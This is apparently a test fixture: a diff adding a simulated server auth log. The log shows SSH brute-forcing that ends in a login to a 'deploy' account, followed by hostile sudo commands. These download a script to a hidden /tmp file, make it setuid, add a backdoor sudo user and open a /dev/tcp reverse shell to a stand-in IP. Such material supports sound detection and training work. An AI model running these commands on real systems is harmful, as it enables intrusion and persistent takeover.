@@ -1,0 +1,46 @@
+Nov  1 02:00:01 web01 CRON[11021]: pam_unix(cron:session): session opened for user root by (uid=0)
+Nov  1 02:00:01 web01 CRON[11022]: (root) CMD (/usr/local/bin/backup.sh > /dev/null 2>&1)
+Nov  1 02:00:02 web01 CRON[11021]: pam_unix(cron:session): session closed for user root
+Nov  1 02:14:37 web01 sshd[11104]: Failed password for alice from 192.0.2.88 port 50112 ssh2
+Nov  1 02:14:44 web01 sshd[11104]: Accepted password for alice from 192.0.2.88 port 50112 ssh2
+Nov  1 02:14:44 web01 sshd[11104]: pam_unix(sshd:session): session opened for user alice by (uid=0)
+Nov  1 02:31:09 web01 systemd[1]: Starting Daily apt download activities...
+Nov  1 02:31:15 web01 systemd[1]: Started Daily apt download activities, sync once.
+Nov  1 02:40:52 web01 sshd[11104]: pam_unix(sshd:session): session closed for user alice
+Nov  1 03:00:01 web01 CRON[11230]: (john) CMD (/home/john/scripts/rotate-reports.sh)
+Nov  1 03:05:12 web01 sshd[11301]: Failed password for root from 198.51.100.77 port 41022 ssh2
+Nov  1 03:47:39 web01 sshd[11388]: Failed password for root from 198.51.100.77 port 41190 ssh2
+Nov  1 04:29:03 web01 sshd[11455]: Failed password for root from 198.51.100.77 port 41377 ssh2
+Nov  1 05:11:58 web01 sshd[11519]: Failed password for root from 198.51.100.77 port 41502 ssh2
+Nov  1 05:52:20 web01 sshd[11587]: Failed password for root from 198.51.100.77 port 41688 ssh2
+Nov  1 06:33:41 web01 sshd[11640]: Failed password for root from 198.51.100.77 port 41720 ssh2
+Nov  1 07:15:00 web01 sshd[11702]: Invalid user admin from 203.0.113.45 port 58001
+Nov  1 07:15:00 web01 sshd[11702]: Failed password for invalid user admin from 203.0.113.45 port 58001 ssh2
+Nov  1 07:15:03 web01 sshd[11704]: Invalid user test from 203.0.113.45 port 58004
+Nov  1 07:15:03 web01 sshd[11704]: Failed password for invalid user test from 203.0.113.45 port 58004 ssh2
+Nov  1 07:15:06 web01 sshd[11706]: Invalid user oracle from 203.0.113.45 port 58009
+Nov  1 07:15:06 web01 sshd[11706]: Failed password for invalid user oracle from 203.0.113.45 port 58009 ssh2
+Nov  1 07:15:09 web01 sshd[11708]: Invalid user ubuntu from 203.0.113.45 port 58013
+Nov  1 07:15:09 web01 sshd[11708]: Failed password for invalid user ubuntu from 203.0.113.45 port 58013 ssh2
+Nov  1 07:15:14 web01 sshd[11711]: Failed password for deploy from 203.0.113.45 port 58020 ssh2
+Nov  1 07:15:17 web01 sshd[11711]: Failed password for deploy from 203.0.113.45 port 58020 ssh2
+Nov  1 07:15:21 web01 sshd[11713]: Failed password for deploy from 203.0.113.45 port 58026 ssh2
+Nov  1 07:15:24 web01 sshd[11713]: Failed password for deploy from 203.0.113.45 port 58026 ssh2
+Nov  1 07:15:28 web01 sshd[11715]: Failed password for deploy from 203.0.113.45 port 58031 ssh2
+Nov  1 07:15:31 web01 sshd[11715]: Failed password for deploy from 203.0.113.45 port 58031 ssh2
+Nov  1 07:15:35 web01 sshd[11717]: Failed password for deploy from 203.0.113.45 port 58037 ssh2
+Nov  1 07:15:39 web01 sshd[11719]: Accepted password for deploy from 203.0.113.45 port 58042 ssh2
+Nov  1 07:15:39 web01 sshd[11719]: pam_unix(sshd:session): session opened for user deploy by (uid=0)
+Nov  1 07:16:02 web01 sudo:   deploy : TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/id
+Nov  1 07:16:40 web01 su[11760]: pam_unix(su:auth): authentication failure; logname=deploy uid=1001 euid=0 tty=pts/1 ruser=deploy rhost=  user=root
+Nov  1 07:16:42 web01 su[11760]: FAILED SU (to root) deploy on pts/1
+Nov  1 07:17:15 web01 sudo:   deploy : TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/wget http://198.51.100.23/update.sh -O /tmp/.u.sh
+Nov  1 07:17:31 web01 sudo:   deploy : TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/bin/chmod 4755 /tmp/.u.sh
+Nov  1 07:18:04 web01 sudo:   deploy : TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/usr/sbin/useradd -m -s /bin/bash sysupdate
+Nov  1 07:18:20 web01 useradd[11801]: new user: name=sysupdate, UID=1003, GID=1003, home=/home/sysupdate, shell=/bin/bash
+Nov  1 07:18:41 web01 sudo:   deploy : TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/usr/sbin/usermod -aG sudo sysupdate
+Nov  1 07:19:10 web01 sudo:   deploy : TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash -c bash -i >& /dev/tcp/198.51.100.23/4444 0>&1
+Nov  1 07:22:55 web01 sshd[11719]: pam_unix(sshd:session): session closed for user deploy
+Nov  1 08:00:01 web01 CRON[11902]: (root) CMD (/usr/lib/sysstat/debian-sa1 1 1)
+Nov  1 09:02:17 web01 sshd[11960]: Accepted publickey for alice from 192.0.2.88 port 50440 ssh2
+Nov  1 09:03:05 web01 sudo:    alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx
